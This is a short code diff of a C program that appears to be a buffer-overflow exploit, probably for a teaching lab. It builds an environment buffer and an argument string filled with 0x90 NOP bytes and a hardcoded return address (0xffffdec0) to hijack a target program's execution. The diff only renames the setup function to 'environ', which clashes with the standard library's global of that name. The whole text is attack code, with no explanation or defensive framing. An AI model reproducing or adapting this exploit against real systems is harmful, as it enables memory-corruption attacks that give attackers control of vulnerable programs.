@@ -12,7 +12,7 @@ const int NOP_SIZE = 201;
 const uint32_t BASE_ADDR = 0xffffdec0;
 const int RET_OFFSET = 4;
 
-void prepareEnvironment(char *env) {
+void environ(char *env) {
     memset(env, 0x90, ENV_SIZE - 1);
     *((uint32_t *)(env)) = BASE_ADDR + RET_OFFSET;
     *((uint32_t *)(env + RET_OFFSET)) = BASE_ADDR + 2 * RET_OFFSET;
@@ -25,7 +25,7 @@ int main(void) {
     char *envp[1];
     char env[ENV_SIZE];
 
-    prepareEnvironment(env);
+    environ(env);
 
     args[0] = TARGET;
     args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
